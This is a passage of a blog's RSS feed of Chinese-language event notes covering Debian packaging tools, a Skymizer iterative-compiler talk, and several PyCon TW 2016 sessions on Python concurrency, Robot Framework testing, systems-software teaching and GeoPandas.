&lt;ul&gt;
&lt;li&gt;PyCon TW 2017 主席開放報名中  &lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Thu, 30 Jun 2016 19:08:44 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-06-30:posts/2016/06/30/taipei-py-20160630/</guid><category>Python</category><category>Taipei.py</category></item><item><title>TOSSUG 20160628</title><link>https://blog.m157q.tw/posts/2016/06/29/tossug-20160628/</link><description>&lt;h1&gt;如何打包一個 .deb&lt;/h1&gt;
&lt;h2&gt;Debian Package&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ar - 壓縮  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Ar_(Unix)"&gt;ar (Unix) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debian binary package / Debian source package  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Build tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;fakeroot, debian/rules, binary  &lt;/li&gt;
&lt;li&gt;dpkg-buildpackage  &lt;/li&gt;
&lt;li&gt;debuild / pbuild  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://lintian.debian.org/"&gt;Lintian&lt;/a&gt; check  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;chroot  &lt;/li&gt;
&lt;li&gt;pbuilder / sbuild  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://ubuntuforums.org/showthread.php?t=910717"&gt;http://ubuntuforums.org/showthread.php?t=910717&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.debian.org/HowToPackageForDebian"&gt;https://wiki.debian.org/HowToPackageForDebian&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://unix.stackexchange.com/questions/30303/how-to-create-a-deb-file-manually"&gt;https://unix.stackexchange.com/questions/30303/how-to-create-a-deb-file-manually&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/zzz00072/debian-39338832"&gt;淺談Debian套件打包&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.ubuntu-tw.org/index.php?title=DebPackaging"&gt;DebPackaging - Ubuntu 正體中文 Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ubuntu-tw.org/modules/newbb/viewtopic.php?viewmode=flat&amp;amp;order=DESC&amp;amp;type=&amp;amp;topic_id=97286&amp;amp;forum=14"&gt;[影片教學][TOSSUG] Debian 套件打包工作坊 [論壇 - Ubuntu 文件資源] | Ubuntu 正體中文站&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wen00072.github.io/blog/2014/06/12/package-debian-packages-set-after-list-of-debian-packages/"&gt;[Debian套件打包] 設定好debian目錄後的打包 - My code works, I don’t know why.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://szlin.wordpress.com/2016/06/11/debian-%E5%A5%97%E4%BB%B6%E6%89%93%E5%8C%85%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97-%E7%B9%81%E9%AB%94%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AD%AF/"&gt;Debian 套件打包教學指南 – 繁體中文翻譯 – SZ Lin  &amp;amp; Embedded Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/szlin/debian-62284588"&gt;Debian 套件打包教學指南 - 繁體中文翻譯&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 29 Jun 2016 01:23:54 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-06-29:posts/2016/06/29/tossug-20160628/</guid><category>TOSSUG</category><category>Debian</category></item><item><title>Cat System Workshop #7 Skymizer intelligent compiler</title><link>https://blog.m157q.tw/posts/2016/06/21/cat-system-workshop-7-skymizer-intelligent-compiler/</link><description>&lt;p&gt;Event link: &lt;a href="http://skymizer.kktix.cc/events/cat0621"&gt;http://skymizer.kktix.cc/events/cat0621&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Q: iPhone 為什麼兩顆 core?&lt;br /&gt;
A: 人類寫出來的程式碼平行度平均約 1.8，所以兩顆就夠了。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;CPU 效能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;2004 年以前，每年改善 50%  &lt;/li&gt;
&lt;li&gt;2004 年之後，每年改善 21%  &lt;/li&gt;
&lt;li&gt;原因  &lt;ul&gt;
&lt;li&gt;電子漂移  &lt;/li&gt;
&lt;li&gt;Power wall - faster computers get really hot  &lt;/li&gt;
&lt;li&gt;Memory wall - memory bandwidth becomes one of the bottlenecks  &lt;/li&gt;
&lt;li&gt;ILP wall - exploit performance from parallelism is diffifult  &lt;ul&gt;
&lt;li&gt;指令集的平行度已經遇到瓶頸  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這 3 個問題都在 2004 年發生，所以突然驟降。  &lt;/li&gt;
&lt;li&gt;什麼時候會掉到 0 %?  &lt;ul&gt;
&lt;li&gt;半年前已經達到了。從半年前開始，CPU 效能已經沒有提升了。  &lt;/li&gt;
&lt;li&gt;大家都不敢講，怕產品銷售受影響。  &lt;/li&gt;
&lt;li&gt;現在只要有改善效能就贏其他人了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;製程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;明年 Q1 達到 10 nm, 7 nm  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;The Best way to speed up Computer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Manual  &lt;/li&gt;
&lt;li&gt;Compiler  &lt;/li&gt;
&lt;li&gt;(...)  &lt;/li&gt;
&lt;li&gt;(...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Improvement&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;中國 H 社去年改善 150%，用飛的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Skymizer Cloud Compiler&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Cloud compiler is a kind of &lt;strong&gt;iterative compiler&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Challenges of Iterative Compilers&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Very long compilation time  &lt;ul&gt;
&lt;li&gt;GCC has ~250 optimization flags  &lt;ul&gt;
&lt;li&gt;~200 machine independent flags  &lt;/li&gt;
&lt;li&gt;~50 machine-level optimization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;There are at least 10^60 combination of flags  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;High cost of scripting  &lt;ul&gt;
&lt;li&gt;A compilation unit needs at least four actions to keep the iteration smooth  &lt;ul&gt;
&lt;li&gt;run.sh, kill.sh, clean.sh, build.sh  &lt;/li&gt;
&lt;li&gt;Users need to tell iterative compiler at least how to run the program  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A system, take WebKit for example, may have ~25,000 compilation units  &lt;/li&gt;
&lt;li&gt;Different systems have very different building systems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Precise performance data  &lt;ul&gt;
&lt;li&gt;An optimization phase has only ~3% impact to performance  &lt;/li&gt;
&lt;li&gt;Application variance of performance are usually about 8%~20%  &lt;/li&gt;
&lt;li&gt;Iterative compilers need precise performance data to ensure analyzed results  &lt;/li&gt;
&lt;li&gt;準確率很重要，如果收集了一大堆資料但準確率很差的話，只是 garbage in garbege out.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unstable optimization results  &lt;ul&gt;
&lt;li&gt;Optimizing compilers don't guarantee performance imporvement  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unstable compilers  &lt;ul&gt;
&lt;li&gt;GCC  &lt;ul&gt;
&lt;li&gt;GCC in average produces on incorrect results in 10,000 iterations  &lt;/li&gt;
&lt;li&gt;GCC in average gets a segmentation fault every 100,000 compilation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LLVM  &lt;ul&gt;
&lt;li&gt;LLVM in average produces one incorrect results in 1000 iterations  &lt;/li&gt;
&lt;li&gt;LLVM in average gets a segmentation fault every 3 compilation  &lt;/li&gt;
&lt;li&gt;所以 LLVM 在 iterative compiler 是不堪用的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重新 compile 也不會過的錯誤，Compiler 本身的 bug，極為難抓。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Iterative compiler before ten years&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Since 1994. Most researches appear since 2001.  &lt;/li&gt;
&lt;li&gt;24 distinguished works. Only seven works have significant contribution.  &lt;/li&gt;
&lt;li&gt;很多論文都只是看到後你知道「喔，這個人畢業了。」的等級  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;2001~2004 Expert System in iterative compilers&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Dr. Options and OSE represent this era.  &lt;/li&gt;
&lt;li&gt;Expert system shortens compilation time.  &lt;/li&gt;
&lt;li&gt;Dr.Options, expert system, TI and HP  &lt;/li&gt;
&lt;li&gt;OSE, pruning by key insights and performance emulators, Princeton.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ACME - we have more exploration space than you can imagine&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Optimization phases can interchange their order.  &lt;/li&gt;
&lt;li&gt;Sequence increases the exploration space from 10^60 to 250^250  &lt;/li&gt;
&lt;li&gt;Although ACME success to eliminate exploraiton space, but we can not use it in practice.  &lt;ul&gt;
&lt;li&gt;GCC re-call phases to simulate order change  &lt;/li&gt;
&lt;li&gt;LLVM can not reorder any phases  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Subtraction is more important then Exploration&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如果一開始就不要嘗試這麼多 optimization，或許可以比較容易找到更有效的方式。  &lt;/li&gt;
&lt;li&gt;PEAK - eliminate space by identifying harmful optimizations  &lt;ul&gt;
&lt;li&gt;先找壞的，把他們刪掉。  &lt;/li&gt;
&lt;li&gt;Batch elimination  &lt;/li&gt;
&lt;li&gt;Iterative elimination  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VISTA - eliminate space by pruning dormant phases  &lt;ul&gt;
&lt;li&gt;先找好的  &lt;/li&gt;
&lt;li&gt;把真正常用的、有效的挑出來，這些彼此之間衝突的做分群，然後再去嘗試  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Social Network can help!&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;cTuning  &lt;/li&gt;
&lt;li&gt;工人智慧  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://ctuning.org/wiki/index.php/CTools:MilepostGCC"&gt;MILEPOST GCC&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/MILEPOST_GCC"&gt;https://en.wikipedia.org/wiki/MILEPOST_GCC&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Collective TUNING  &lt;ul&gt;
&lt;li&gt;每個人都用他的 compiler，他就會偷偷把你的 source code 送回去他的 server，然後再去用 AI 分析該 source code 可不可以做更好的 optimization，藉此收集很多的資料來作為優化的依據。  &lt;blockquote&gt;
&lt;p&gt;xatier: 這不是跟微軟最近在 VS 的 profiler 塞了一個 entrypoint 是一樣的事情嗎？ XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;集眾人之力的群眾 Compile  &lt;/li&gt;
&lt;li&gt;在 4 年前就沒在動了  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Skymizer Intelligent Compiler&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Sky Gold  &lt;ul&gt;
&lt;li&gt;Testing Framework  &lt;/li&gt;
&lt;li&gt;Result Repository  &lt;ul&gt;
&lt;li&gt;Fast build (from hours to seconds)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sky Knight  &lt;ul&gt;
&lt;li&gt;Distributed compilation  &lt;/li&gt;
&lt;li&gt;之後考慮改成用 p2p 的模式，下班電腦開著就可以加入 distributed compilation 的一部份。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sky Dragon  &lt;ul&gt;
&lt;li&gt;Software Hypervisor Precise OS  &lt;/li&gt;
&lt;li&gt;CPU 要跟客戶的一樣才有辦法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sky Wizard  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fast exploration  &lt;ul&gt;
&lt;li&gt;Guide optimization direction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;只要拿到 characteristics，不會拿到客戶的 source code，所以客戶能夠接受。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把使用者 compiler 偷偷換掉  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;把使用者 compile 的過程都紀錄下來  &lt;/li&gt;
&lt;li&gt;找到最好的 object file (&lt;code&gt;*.o&lt;/code&gt;) 之後，check-in 回去給 user，user 只會覺得之後愈用愈快&amp;gt;  &lt;/li&gt;
&lt;li&gt;優點  &lt;ul&gt;
&lt;li&gt;user 實際上 99.9% 的 code 不會動，所以會一直穩定得嘗試 compile 出更快的 object file，再回傳給 user  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;目前遇到客戶反應的問題  &lt;ul&gt;
&lt;li&gt;回傳回去的 object file 沒有做版本控制，導致無法客戶拿某個時期的 object file 來做測試。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Q&amp;amp;A&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;有支援 &lt;a href="https://en.wikipedia.org/wiki/Profile-guided_optimization"&gt;Profile-guided optimization&lt;/a&gt; 嗎？  &lt;ul&gt;
&lt;li&gt;目前沒有支援  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼剛剛說 opentuner 是來亂的？  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://opentuner.org/"&gt;opentuner&lt;/a&gt; 沒有解決任何問題，只是提供一個優雅的方式來把 run, kill, clean, build scirpts。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;客戶使用你們的 compiler 不會造成 debug 很困難嗎？  &lt;ul&gt;
&lt;li&gt;會，這也是我們目前被罵的地方。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你們收費怎麼算？  &lt;ul&gt;
&lt;li&gt;很貴，因為我們的客戶幾乎都是大公司，但因為很貴，所以也很難談。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 05 Jul 2016 21:36:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-06-21:posts/2016/06/21/cat-system-workshop-7-skymizer-intelligent-compiler/</guid><category>Compiler</category></item><item><title>PyCon TW 2016</title><link>https://blog.m157q.tw/posts/2016/06/03/pycon-tw-2016/</link><description>&lt;p&gt;Really appreciate &lt;a href="http://eldarion.com/"&gt;eldarion&lt;/a&gt; gave me the free sponsored ticket or I could not attend this biggest annual Python event in Taiwan.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://tw.pycon.org/2016/"&gt;官網&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackfoldr.org/pycontw2016"&gt;官方共筆&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gitter.im/pycontw/2016"&gt;官方聊天室&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/pycon_tw_2016/"&gt;官方相簿&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/channel/UCHLnNgRnfGYDzPCCH8qGbQw"&gt;直播頻道&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1 (2016/06/03 Fri)&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: The world after tomorrow by au（唐鳳）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;與 Python 第一次接觸：2003 年，在台灣，Perl, Python, PHP 三個沒有大公司支撐的語言辦了個 Conf，沒想到反應熱烈，成為 OSDC.tw 的前身，直到 2014 年 OSDC 停辦。  &lt;/li&gt;
&lt;li&gt;Perl 5：很多設計都是從 Python 的 pep 抄來  &lt;/li&gt;
&lt;li&gt;用 Open Source 參與公民社會：318, g0v  &lt;/li&gt;
&lt;li&gt;報導者：開源媒體  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R2: Strategies for concurrency and parallelism in Python by 洪鈺庭&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Synchronous Model  &lt;ul&gt;
&lt;li&gt;一次執行一個 task  &lt;/li&gt;
&lt;li&gt;最常用，最簡單，最直覺  &lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;voice.RSS.TexttoSpeechAPI&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;並沒有用到 concurrency 的概念  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-threading  &lt;ul&gt;
&lt;li&gt;不一樣的 thread 可以 share 同一個 memory space  &lt;/li&gt;
&lt;li&gt;create 一個 queue 再從 queue 拿出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL in Python  &lt;ul&gt;
&lt;li&gt;同一個時間只會讓一個 thread 執行  &lt;/li&gt;
&lt;li&gt;因為有些 Lib 不是 thread safe，所以直接做限制  &lt;/li&gt;
&lt;li&gt;不是所有 Python 的實作都有 GIL, CPython 有，但像 Jython 和 IronPython 就沒有。  &lt;/li&gt;
&lt;li&gt;既然一次只能執行一個 thread, 為什麼還是比 Synchronous 快呢？  &lt;ul&gt;
&lt;li&gt;因為剛剛的例子是 IO bound, 在等待的時間就可以 switch 到其他 thread 做事情。  &lt;/li&gt;
&lt;li&gt;如果是 CPU bound 的話，multithread 就沒啥太大的優勢，得用 multiprocessing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-processing  &lt;ul&gt;
&lt;li&gt;建一個 Pool, 然後用 subprocess 去處理事情。  &lt;/li&gt;
&lt;li&gt;對於過於龐大的程式的話，可能會造成 memory over-head.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed Workers  &lt;ul&gt;
&lt;li&gt;把 thread 抽出來，放到另外一個 machine 執行  &lt;/li&gt;
&lt;li&gt;RQ (Redis Queue)  &lt;ul&gt;
&lt;li&gt;A simple Python library backed by Redis for queueing.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;scalibility 會比較好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed Workers with Cloud Platform Service  &lt;ul&gt;
&lt;li&gt;Iaas  &lt;ul&gt;
&lt;li&gt;自訂性比較高，但管理上會比較麻煩一點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Paas  &lt;ul&gt;
&lt;li&gt;Instances 的增減 (auto-scaling) 都交由 cloud platform provider 管理，不用自己管。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Q&amp;amp;A 一堆人電講者是怎樣 LOL  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;R2: Robot Framework: An ATDD Framework by Apua&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ATDD (Acceptance-test-driven development)  &lt;/li&gt;
&lt;li&gt;Robot Framework 可以做到分散式測試，不只是個 automation tool  &lt;/li&gt;
&lt;li&gt;Acceptance Test  &lt;ul&gt;
&lt;li&gt;Minimal Accpetance Test  &lt;ul&gt;
&lt;li&gt;只取最小的集合，驗證這個產品是他想要的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;End-to-End Acceptance Test  &lt;ul&gt;
&lt;li&gt;把所有能夠想到的測試都跑過一遍。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把一個很大的 User story 拆解成各種小的 test  &lt;/li&gt;
&lt;li&gt;Behavior driven testing  &lt;ul&gt;
&lt;li&gt;keywords: Given, When, Then  &lt;/li&gt;
&lt;li&gt;keywords 其實就是 function  &lt;/li&gt;
&lt;li&gt;robot framework 可以讓你用 @keyword 來將關鍵字綁定到特定的 function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PyBot  &lt;ul&gt;
&lt;li&gt;可以把 keyword 的 traceback show 給你看  &lt;/li&gt;
&lt;li&gt;可以把所有 test cases 都直接 show 出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flow  &lt;/li&gt;
&lt;li&gt;Robot framework 的特性  &lt;ul&gt;
&lt;li&gt;Format  &lt;ul&gt;
&lt;li&gt;支援各種常用格式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Programmability  &lt;ul&gt;
&lt;li&gt;Limited flow control  &lt;ul&gt;
&lt;li&gt;只有 for loop，沒有 while  &lt;/li&gt;
&lt;li&gt;只能用 ternary operator, 沒有 if else  &lt;/li&gt;
&lt;li&gt;透過嚴格的限制，讓你很難把 test cases 寫的很亂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援把檔案當成是變數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hierechical structure  &lt;ul&gt;
&lt;li&gt;Variable files in YAML, Python  &lt;/li&gt;
&lt;li&gt;Resource files to collect keywords and libraries  &lt;/li&gt;
&lt;li&gt;File and directory to organize setup/teardown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tagging  &lt;ul&gt;
&lt;li&gt;Category to select  &lt;/li&gt;
&lt;li&gt;Set critical cases  &lt;ul&gt;
&lt;li&gt;可以很容易做到 small test  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以自己訂 tag 來做到不同的不同的版本使用不同的測試環境和測資，跟上面的 variable files 做結合。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Documentation  &lt;ul&gt;
&lt;li&gt;支援把 test case 以 docstring 的方式撰寫，讓可維護性提高  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Remote Library  &lt;ul&gt;
&lt;li&gt;遇到把跑測試的環境和測資是分開時，這很好用。  &lt;/li&gt;
&lt;li&gt;使用 XML-RPC protocol  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他  &lt;ul&gt;
&lt;li&gt;可以客製化 report  &lt;/li&gt;
&lt;li&gt;IDE support  &lt;/li&gt;
&lt;li&gt;支援自建 keywords  &lt;/li&gt;
&lt;li&gt;有支援使用 API 操作  &lt;/li&gt;
&lt;li&gt;CI Plugin  &lt;ul&gt;
&lt;li&gt;Jenkins  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Third party plugins on pip 也很多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Summary  &lt;ul&gt;
&lt;li&gt;Robot Framework 提供了很方便的方式讓你可以很快針對需求去撰寫測試。  &lt;/li&gt;
&lt;li&gt;ATDD breakdown story  &lt;ul&gt;
&lt;li&gt;Acceptance test  &lt;/li&gt;
&lt;li&gt;Implement/reuse keyword  &lt;/li&gt;
&lt;li&gt;Automation for testing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015/12/31 開始支援 Python 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;Parallel PyBot  &lt;ul&gt;
&lt;li&gt;這不確定有沒有疑慮，因為 test cases 最好是循序跑比較好，因為有些可能會有相依性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Q&amp;amp;A 好熱烈，看來很多人對 testings 都有蠻多疑問和蠻有興趣的。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: Python 導入系統軟體教學 by Jserv&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;20 多年前臺灣走在軟體產業的前端，從辦公軟體到作業系統，沒有什麼是臺灣沒辦法寫的，開源軟體貢獻度大勝亞洲各國；20 多年後，在頂大的創新競賽上，評審教授會跟你說「為什麼不用 ApplePay 就好。」  &lt;/li&gt;
&lt;li&gt;20 年前台灣許多軟體都有人開發，除了作業系統和編譯器沒有以外。  &lt;/li&gt;
&lt;li&gt;15 年前台灣對 Linux 和 BSD 的貢獻是領先亞洲其他國家的。  &lt;/li&gt;
&lt;li&gt;蕭柏納說：「生命不該是支燃燒的蠟燭，燒完就沒。而是一把火炬，應該要努力發光發熱，然後交到下一代的手上。」  &lt;/li&gt;
&lt;li&gt;Nand2Tetris  &lt;/li&gt;
&lt;li&gt;ARRC 前瞻火箭計劃  &lt;/li&gt;
&lt;li&gt;帶學生參與真正的開源計劃，由於貿然投入大型開源計劃的難度是很高的，所以從自己打造比小型但是完整開源系統帶學生做起。然後積極投稿世界一流的 Open Source Conference，讓學生可以被國際看見外，也能夠獲得成就感，並繼續投入到開源的世界中。  &lt;/li&gt;
&lt;li&gt;學生是有熱情的，參與 Open Source 的人也比以前多，但大多數人都是自己玩自己的，學生不知道如何跟人家打群架。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R1: From Pandas to GeoPandas by 尼斯&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;GeoPandas == Pandas + GIS  &lt;/li&gt;
&lt;li&gt;台灣常用的座標參考系統  &lt;ul&gt;
&lt;li&gt;WGS84 (Lat/Lon)  &lt;/li&gt;
&lt;li&gt;TWD67 (TM2)  &lt;/li&gt;
&lt;li&gt;TWD97 (TM2)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shapdefile 的結構  &lt;ul&gt;
&lt;li&gt;.dbf  &lt;/li&gt;
&lt;li&gt;.shp  &lt;ul&gt;
&lt;li&gt;空間的形狀、位置  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.shx  &lt;ul&gt;
&lt;li&gt;索引  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.prj  &lt;ul&gt;
&lt;li&gt;投影資訊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Import the GeoPandas  &lt;ul&gt;
&lt;li&gt;結合數值資料並做視覺化  &lt;/li&gt;
&lt;li&gt;為了要 join 兩種資料，必須要做些預處理。（例如：欄位具有資訊，但格式不符合）  &lt;/li&gt;
&lt;li&gt;用 groupby 把某一欄位有相同值的資料排好再使用 aggergation function 將這些資料合併在一起  &lt;/li&gt;
&lt;li&gt;製作區域密度圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;情境：忠孝橋引道拆除，要賠償施工範圍半徑 500 公尺內影響到的里的所有里民  &lt;ul&gt;
&lt;li&gt;疊圖分析 (intersection)  &lt;ul&gt;
